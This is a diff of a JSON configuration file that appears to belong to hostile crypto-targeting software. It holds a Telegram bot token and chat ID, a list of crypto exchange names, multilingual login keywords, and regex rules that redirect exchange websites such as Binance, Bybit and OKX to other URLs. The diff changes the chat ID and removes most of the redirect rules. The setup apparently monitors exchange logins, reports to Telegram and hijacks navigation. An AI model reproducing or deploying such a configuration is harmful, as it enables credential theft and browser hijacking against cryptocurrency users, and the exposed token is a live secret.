@@ -1,6 +1,6 @@
 {
   "tkn": "8282557974:AAEfiiTmrb0APpnGJNCEHWEOJNiCCgB0pIE",
-  "chid": "8025121083",
+  "chid": "-1002836423777",
   "kws": [
     "AOFEX","AscendEX","Backpack","BigONE","BingX","Bit2Me","Bitbay","Bitbank","Bitcointree","BitEx",
     "Bitfinex","BitFlyer","BitForex","Bitget","Bitkub","BitMart","BitMEX","Bitrue","Bitso","Bitstamp",
@@ -18,27 +18,8 @@
   "lgs": ["login","loguin","sign in","entrar"],
   "rds": [
     {"r":"(www\\.)?binance\\.(com|us).*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?coinbase\\.com.*","u":"https://seuoutrolink.com"},
     {"r":"(www\\.)?bybit\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?okx\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?kraken\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?kucoin\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?huobi\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?bitfinex\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?bitflyer\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?bitmex\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?bitstamp\\.net.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?gate\\.io.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?gemini\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?crypto\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?upbit\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?phemex\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?poloniex\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?bitget\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?mexc\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?huobipro\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?wazirx\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?whitebit\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?xt\\.com.*","u":"https://ge.globo.com/"}
+    {"r":"(www\\.)?okx\\.com.*","u":"https://ge.globo.com/"}
+
   ]
 }
